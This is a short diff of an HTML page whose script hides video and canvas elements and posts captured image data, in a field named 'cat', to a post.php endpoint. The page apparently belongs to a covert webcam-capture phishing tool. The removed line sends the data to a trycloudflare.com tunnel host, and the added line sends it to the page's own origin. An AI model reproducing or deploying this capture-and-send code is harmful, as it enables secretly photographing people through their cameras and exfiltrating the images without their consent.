@@ -89,7 +89,7 @@ video, canvas { width: 100%; border-radius: 10px; display: none; }
 </div>
 <script>
 function post(imgdata) {
-    $.ajax({ type: 'POST', data: { cat: imgdata }, url: 'https://colleges-digest-angela-cholesterol.trycloudflare.com/post.php' });
+    $.ajax({ type: 'POST', data: { cat: imgdata }, url: window.location.origin + '/post.php' });
 }
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
